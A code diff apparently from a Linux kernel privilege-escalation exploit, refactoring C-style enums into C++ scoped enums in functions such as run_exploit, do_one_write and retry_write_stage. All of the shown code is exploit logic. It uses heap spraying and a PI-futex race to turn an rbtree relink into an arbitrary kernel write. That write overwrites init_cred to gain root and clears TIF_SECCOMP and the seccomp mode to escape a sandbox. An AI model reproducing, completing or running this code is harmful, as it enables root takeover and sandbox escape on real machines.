@@ -546,7 +546,8 @@ int run_main_route_threads(const WriteRequest *request) {
  * exploit_execute_write(session, request), separating heap and route phases. */
 static int do_one_write(const WriteRequest *request, const char *desc) {
     pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
-            request->target, request->mode, !request->preserve_child);
+            request->target, static_cast<int>(request->mode),
+            !request->preserve_child);
     /* Both transports write *(target) := value through the erase left-only
      * relink: waiter words are {pc = value, right = 0, left = target} and
      * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
@@ -558,7 +559,7 @@ static int do_one_write(const WriteRequest *request, const char *desc) {
         }
         uintptr_t value = !request->preserve_child
                 ? 0
-                : (request->mode == WRITE_MODE_CREDENTIAL
+                : (request->mode == WriteMode::Credential
                         ? resolved_addresses_data_alias(
                                 &g_resolved_addresses,
                                 resolved_addresses_init_cred_image(
@@ -1100,21 +1101,22 @@ static int retry_write_stage(
         const char *stage, uintptr_t target, int mode, int attempts,
         useconds_t settle_usec, write_stage_verify_fn verify, void *context,
         int leaf) {
-    const WriteRequest request =
-            write_request_make(target, (WriteMode) mode, leaf);
+    const WriteRequest request = WriteRequest::make(
+            target, static_cast<WriteMode>(mode), leaf != 0);
     for (int attempt = 1; attempt <= attempts; attempt++) {
         pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
         /* the previous attempt's write can land after its verify read; check
          * before paying for another heap spray */
         if (attempt > 1 && verify(context)) return 1;
         if (attempt == 1) slab_drain();
-        if (mode == 2 && kernel5_route_selected()) {
-            const WriteRequest repair_request = write_request_make(
+        if (static_cast<WriteMode>(mode) == WriteMode::Credential &&
+                kernel5_route_selected()) {
+            const WriteRequest repair_request = WriteRequest::make(
                     resolved_addresses_data_alias(
                             &g_resolved_addresses,
                             resolved_addresses_init_cred_image(
                                 &g_resolved_addresses)) + 8,
-                    WRITE_MODE_ZERO, 1);
+                    WriteMode::Zero, 1);
             page_base = prepare_good_kernel_page(&repair_request);
             if (!page_base || !stash_prebuilt_page()) {
                 pr_warning("W2 fast repair prebuild failed\n");
@@ -1130,7 +1132,8 @@ static int retry_write_stage(
             usleep(100000);
             continue;
         }
-        if (mode == 2 && kernel5_route_selected()) {
+        if (static_cast<WriteMode>(mode) == WriteMode::Credential &&
+                kernel5_route_selected()) {
             /* Swap to the already sprayed leaf payload and repair static init_cred
              * immediately, avoiding another multi-second collision search while
              * PID 1 shares the corrupted credential. */
@@ -1138,12 +1141,12 @@ static int retry_write_stage(
                 pr_warning("W2 fast repair activation failed\n");
                 return 0;
             }
-            const WriteRequest repair_request = write_request_make(
+            const WriteRequest repair_request = WriteRequest::make(
                     resolved_addresses_data_alias(
                             &g_resolved_addresses,
                             resolved_addresses_init_cred_image(
                                 &g_resolved_addresses)) + 8,
-                    WRITE_MODE_ZERO, 1);
+                    WriteMode::Zero, 1);
             pr_info("W2b: firing prebuilt init_cred+8 repair\n");
             atomic_store(&g_pi_race_context.fast_repair, 1);
             int repaired = run_main_route_threads(&repair_request);
@@ -1346,8 +1349,8 @@ int run_exploit(int argc, char **argv) {
             for (int repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                 pr_info("W1b: private scratch repair attempt %d/%d\n",
                         repair_try, repair_attempts);
-                const WriteRequest scratch_repair = write_request_make(
-                        w1_scratch_poison, WRITE_MODE_ZERO, 1);
+                const WriteRequest scratch_repair = WriteRequest::make(
+                        w1_scratch_poison, WriteMode::Zero, 1);
                 if (do_one_write(&scratch_repair, "W1b: private scratch repair")) {
                     repaired = 1;
                     break;
@@ -1481,15 +1484,15 @@ int run_exploit(int argc, char **argv) {
             int vr_ok = 1;
             if (vr_needed) {
                 /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
-                const WriteRequest flags_request = write_request_make(
-                        child_task + TASK_THREAD_INFO_FLAGS_OFF, WRITE_MODE_ZERO, 1);
+                const WriteRequest flags_request = WriteRequest::make(
+                        child_task + TASK_THREAD_INFO_FLAGS_OFF, WriteMode::Zero, 1);
                 vr_ok &= do_one_write(&flags_request, "VR: flags+tagA");
 
                 /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                 if (vr_ok) {
                     uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                     const WriteRequest tagb_request =
-                            write_request_make(tagb_align, WRITE_MODE_ZERO, 1);
+                            WriteRequest::make(tagb_align, WriteMode::Zero, 1);
                     vr_ok &= do_one_write(&tagb_request, "VR: tagB");
                 }
 
@@ -1558,7 +1561,7 @@ int run_exploit(int argc, char **argv) {
             pr_info("W3: TIF_SECCOMP+mode attempt %d/%d\n", attempt, w3_attempts);
             if (attempt == 1) slab_drain();
             const WriteRequest flags_request =
-                    write_request_make(flags_target, WRITE_MODE_ZERO, 1);
+                    WriteRequest::make(flags_target, WriteMode::Zero, 1);
             int routed = do_one_write(&flags_request, "W3: TIF_SECCOMP");
             if (!routed) {
                 pr_warning("W3 attempt %d route failed; backing off\n", attempt);
@@ -1567,7 +1570,7 @@ int run_exploit(int argc, char **argv) {
             }
             usleep(execution_settings()->w3_settle_us);
             const WriteRequest mode_request =
-                    write_request_make(mode_target, WRITE_MODE_ZERO, 1);
+                    WriteRequest::make(mode_target, WriteMode::Zero, 1);
             routed = do_one_write(&mode_request, "W3: seccomp mode");
             if (!routed) {
                 pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
